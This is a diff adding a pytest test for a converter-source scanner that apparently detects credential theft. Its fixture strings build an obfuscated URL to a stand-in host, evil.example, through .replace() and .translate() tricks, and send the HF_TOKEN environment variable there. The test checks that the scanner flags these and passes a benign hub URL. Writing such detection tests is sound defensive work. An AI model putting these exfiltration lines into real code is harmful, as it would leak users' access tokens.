@@ -3893,6 +3893,53 @@ def test_a_builder_or_a_docstring_reader_that_arrives_by_import_refuses_it():
     ) == []
 
 
+def test_a_constant_rewritten_into_a_url_refuses_it():
+    """A scheme that does not exist until a method call runs.
+
+    "httpsX//evil.example/c".replace("X", ":") holds no scheme for the walk to
+    find, and the reshape rule watched names that carry a URL rather than
+    literals that become one, so the hub literal beside it granted the
+    allowance. A rewrite whose arguments can be read is folded and the real
+    destination is read; one whose arguments cannot is refused.
+
+    Upstream is untouched: every .replace() in gguf-py/gguf/utility.py rewrites
+    a parameter, never a constant, and appending a path to the hub URL is what
+    it does for real.
+    """
+    scan_converter_source = _load(
+        "converter_scan_rewrite_probe", "unsloth_zoo/converter_scan.py",
+    ).scan_converter_source
+
+    hub = 'HUB = "https://huggingface.co"\n'
+    send = 'requests.get(url, params = {"t": os.environ["HF_TOKEN"]})\n'
+    for body in (
+        hub + 'url = "httpsX//evil.example/c".replace("X", ":")\n' + send,
+        hub + 'url = "httpsX//evil.example/c".replace(marker, colon)\n' + send,
+        hub + 'url = "httpsX//evil.example/c".translate(table)\n' + send,
+    ):
+        assert [
+            f.check for f in scan_converter_source(
+                'import os\nimport requests\n' + body
+            )
+        ], body
+
+    # Appending a path to the hub, in the shape a chain of appends really
+    # parses in: (HUB + "/api/") + name, where the delimiter that ended the
+    # authority sits inside the left operand rather than beside it.
+    assert scan_converter_source(
+        'import os\nimport requests\n' + hub
+        + 'name = base.strip().replace(" ", "-").replace("/", "-")\n'
+        + 'url = HUB + "/api/" + name\n' + send
+    ) == []
+    # And the authority is still guarded when nothing has closed it yet.
+    assert [
+        f.check for f in scan_converter_source(
+            'import os\nimport requests\n' + hub
+            + 'url = HUB + "@evil.example" + "/c"\n' + send
+        )
+    ]
+
+
 def test_the_hub_narrowing_does_not_reach_any_other_rule():
     """Only the env-harvest combination is narrowed. A credential stealer or a
     remote-code loader that happens to mention the hub is untouched.
